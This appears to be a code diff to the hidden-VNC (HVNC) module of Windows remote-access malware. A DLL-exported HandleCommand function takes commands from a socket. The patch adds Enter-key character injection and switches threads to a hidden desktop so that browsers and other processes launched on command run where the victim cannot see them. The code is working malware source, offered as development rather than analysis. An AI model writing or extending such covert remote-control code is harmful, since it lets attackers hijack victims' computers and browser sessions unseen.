@@ -1177,6 +1177,11 @@ static void input_loop() {
                 send_keyboard_message(hTarget, WM_KEYDOWN, (WPARAM)vk,
                                       key_lparam((WORD)vk, false),
                                       ctrlDown, altDown, shiftDown);
+                if (vk == VK_RETURN) {
+                    send_keyboard_message(hTarget, WM_CHAR, (WPARAM)13,
+                                          key_lparam((WORD)vk, false),
+                                          ctrlDown, altDown, shiftDown);
+                }
             } else if (action == "hvnc_keyup") {
                 if (is_ctrl_key(vk)) ctrlDown = false;
                 if (is_alt_key(vk)) altDown = false;
@@ -1659,6 +1664,12 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     si.wShowWindow  = SW_SHOWNORMAL;
 
                     PROCESS_INFORMATION pi = { 0 };
+
+                    HDESK hCurrentDesktop = GetThreadDesktop(GetCurrentThreadId());
+                    if (g_hHiddenDesktop) {
+                        SetThreadDesktop(g_hHiddenDesktop);
+                    }
+
                     if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
                                        0, NULL, NULL, &si, &pi)) {
                         CloseHandle(pi.hProcess);
@@ -1668,10 +1679,19 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     } else {
                         send_error("Failed to start browser. Error: " + to_string(GetLastError()));
                     }
+
+                    if (hCurrentDesktop) {
+                        SetThreadDesktop(hCurrentDesktop);
+                    }
                 }).detach();
             } else {
                 ensure_desktop();
                 if (!g_hHiddenDesktop) return;
+
+                HDESK hCurrentDesktop = GetThreadDesktop(GetCurrentThreadId());
+                if (g_hHiddenDesktop) {
+                    SetThreadDesktop(g_hHiddenDesktop);
+                }
 
                 vector<wchar_t> cmdLine(wRequestedPath.begin(), wRequestedPath.end());
                 cmdLine.push_back(L'\0');
@@ -1691,6 +1711,10 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     send_status("Process started on hidden desktop");
                 } else {
                     send_error("Failed to start process. Error: " + to_string(GetLastError()));
+                }
+
+                if (hCurrentDesktop) {
+                    SetThreadDesktop(hCurrentDesktop);
                 }
             }
         } else if (action.find("hvnc_mouse") != string::npos ||
